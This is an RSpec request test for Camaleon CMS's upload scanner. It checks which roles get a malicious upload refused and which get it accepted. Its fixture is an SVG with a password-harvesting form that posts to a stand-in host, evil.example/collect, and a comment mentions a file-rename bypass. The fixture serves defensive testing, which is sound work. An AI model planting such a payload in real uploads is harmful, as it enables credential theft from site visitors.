# frozen_string_literal: true

require 'rails_helper'

# The module-level contract is pinned in spec/lib/camaleon_cms/upload_scan_permission_spec.rb.
# This pins it where it actually matters: through the real controller, with the real request
# context that AdminController populates, for both sides of the grant.
RSpec.describe 'Upload scanning through the media endpoint', type: :request do
  init_site

  let(:current_site) { Cama::Site.first.decorate }

  # Passes SvgContentChecker as it stood before this change and fails BLOCKED_ELEMENTS under any
  # non-SVG name -- the disagreement the rename bypass walked through.
  let(:svg_with_form) do
    <<~SVG
      <?xml version="1.0" encoding="UTF-8"?>
      <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
        <form action="https://evil.example/collect" method="post"><input name="password"/></form>
      </svg>
    SVG
  end

  def upload(content, extension:, user:)
    sign_in_as(user, site: current_site)
    file = Tempfile.new(['scan-permission', extension])
    file.write(content)
    file.rewind
    post '/admin/media/upload',
         params: { file_upload: Rack::Test::UploadedFile.new(file.path, 'application/octet-stream'), folder: '' }
  ensure
    file&.close!
    file&.unlink
  end

  context 'with a role holding only media management' do
    let(:role) { current_site.user_roles.create!(name: 'Media only', slug: 'media-only-scan') }
    let(:user) { create(:user, role: role.slug, site: current_site) }

    before { role.set_meta("_manager_#{current_site.id}", { 'media' => 1 }) }

    it 'refuses an SVG carrying a form' do
      upload(svg_with_form, extension: '.svg', user: user)

      expect(response.body).to include('Potentially malicious content found!')
    end

    it 'refuses the bytes uploaded under an .html name' do
      upload(svg_with_form, extension: '.html', user: user)

      expect(response.body).to include('Potentially malicious content found!')
    end

    it 'refuses an executable script upload' do
      upload('console.log(1)', extension: '.js', user: user)

      expect(response.body).to include('Potentially malicious content found!')
    end
  end

  context 'with a role granted media_unfiltered_upload' do
    let(:role) { current_site.user_roles.create!(name: 'Media trusted', slug: 'media-trusted-scan') }
    let(:user) { create(:user, role: role.slug, site: current_site) }

    before do
      role.set_meta("_manager_#{current_site.id}", { 'media' => 1, 'media_unfiltered_upload' => 1 })
    end

    it 'accepts the same bytes uploaded under an .html name' do
      upload(svg_with_form, extension: '.html', user: user)

      expect(response.body).not_to include('Potentially malicious content found!')
    end

    # The permission is reused rather than replaced precisely so this keeps working: a holder skips
    # scanning entirely and could already store script before the gate existed.
    it 'accepts an executable script upload' do
      upload('console.log(1)', extension: '.js', user: user)

      expect(response.body).not_to include('Potentially malicious content found!')
    end
  end

  context 'with an administrator' do
    let(:user) { current_site.users.admin_scope.first }

    it 'accepts content the scan would reject, through can :manage, :all' do
      upload(svg_with_form, extension: '.html', user: user)

      expect(response.body).not_to include('Potentially malicious content found!')
    end

    it 'accepts an executable script upload' do
      upload('console.log(1)', extension: '.js', user: user)

      expect(response.body).not_to include('Potentially malicious content found!')
    end
  end

  # The scan decision and the script refusal share one fail-closed predicate, so a caller with no
  # request context -- a rake task, a job, the console -- is untrusted for both.
  context 'without a request context' do
    let(:scanner) { Class.new { include CamaleonCms::UploaderContentSecurity }.new }

    before do
      allow(CurrentRequest).to receive_messages(user: nil, site: nil)
    end

    it 'treats the uploader as untrusted' do
      expect(scanner.cama_trusted_for_unfiltered_upload?).to be(false)
    end

    it 'refuses a script upload' do
      expect(scanner).to be_content_unsafe('console.log(1)', filename: 'lib.js')
    end
  end
end
